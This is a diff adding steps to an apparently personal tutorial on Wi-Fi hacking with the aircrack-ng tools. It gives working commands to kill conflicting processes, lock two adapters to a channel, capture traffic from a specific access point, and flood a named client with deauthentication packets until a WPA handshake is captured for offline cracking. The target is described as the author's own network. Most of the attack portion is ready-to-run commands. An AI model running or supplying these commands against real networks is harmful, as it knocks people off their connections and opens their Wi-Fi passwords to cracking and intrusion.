@@ -45,6 +45,10 @@
 ![Lsusb](./lsusb.jpg)
 
 * as you can see there are 2 USB WIFI ADAPTERS available and connected...lets put them both into Monitor mode
+* Now, Kill all the Conflicting Processes before putting interfaces to monitor mode by,
+* ```Bash Terminal
+  sudo airmon-ng check kill
+  ```
 * GO ahead and put the interface down, impose monitor mode and Enable it with these commands
 ```Bash Terminal
 sudo ip link set wlan0 down
@@ -63,3 +67,44 @@ sudo airodump-ng wlan0
 (Sometimes, the interface in which Monitor mode is enabled ,may change its name to `wlan0mon` So check that too in Case.....)
 
 * Now, You can see Details,info which Normally Your Computer wont Expose Basically !!!!!
+![Airodump-ng-watch](./Scanning-with-airodump-ng.jpg)
+* As you can see, there is my AP(PRofessor M) which i,m gonna Attack....(WITH A CLIENT)
+so its clear that the Address = 96:AB:91:B5:63:68, Channel = 11
+
+# STEP 3 (Starting The Attack)
+Now, we,ll Divert our Both Netwrok Adapters to the Channel 11 by this command
+```Bash Terminal
+sudo iwconfig wlan0 channel 11
+sudo iwconfig wlan1 channel 11
+```
+now, if we make our first interface to listen for a handshake and name it `hack1`, locked to the AP= `96:AB:91:B5:63:68` to only channel 11 by
+```Bash Terminal
+sudo airodump-ng -w hack1 -c 11 --bssid 96:AB:91:B5:63:68 wlan0
+```
+We are Gifted with this output which is crucial
+![AP locked at channel 11 with clearance](./Client-locked-airodump.jpg)
+* This make sure to captures the handshake and even show whether our attack worked...
+
+* Now, in a second Terminal we,ll tell interface 2 (wlan1) to send Deauthentication packets specifically to that client using Aireplay-ng
+```Bash Terminal
+sudo aireplay-ng --deauth 0 -a 96:AB:91:B5:63:68 -c 7C:FA:80:26:71:B4 wlan1
+```
+[Deauth view](./Deauth.jpg)
+
+* Now, You can see the parameters Fluctuating crazy....in our Listener
+[Attack-result](./Client-losing.jpg)
+This proves our Deauth Attack is working...
+
+* Now as you van see, the Client tried to connect to the network again and failed after kicking it out through deauth attack
+[Client faah](./Client-Failure.jpg)
+
+**But, we Captured a Handshake !!!!**
+[Handshake success](./Handshake-success.jpg)
+
+# STEP 4 ( The Offline Work !!!!)
+* Now you an see some capture Notes files in your user directory
+[Handhake display](./Handshake-display.jpg)
+
+
+
+
